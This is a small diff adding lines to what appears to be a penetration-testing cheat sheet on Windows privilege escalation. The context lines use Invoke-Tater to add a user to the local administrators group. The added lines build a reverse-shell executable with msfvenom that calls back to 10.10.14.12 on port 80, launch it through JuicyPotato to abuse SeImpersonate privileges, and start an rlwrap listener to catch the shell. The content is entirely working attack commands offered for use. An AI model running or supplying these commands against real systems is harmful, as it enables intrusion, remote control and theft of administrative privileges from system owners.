@@ -1608,7 +1608,10 @@ Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 #It will take some time to add
 net localgroup administrators
 
-
+# SeImpersonatePrivileges Juice potato - https://github.com/ohpe/juicy-potato/releases
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe
+C:\temp\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443
+rlwrap -nlvp 80 #Since port in 443 but listen on port 80 msfvenom created on it
 
 ```
 
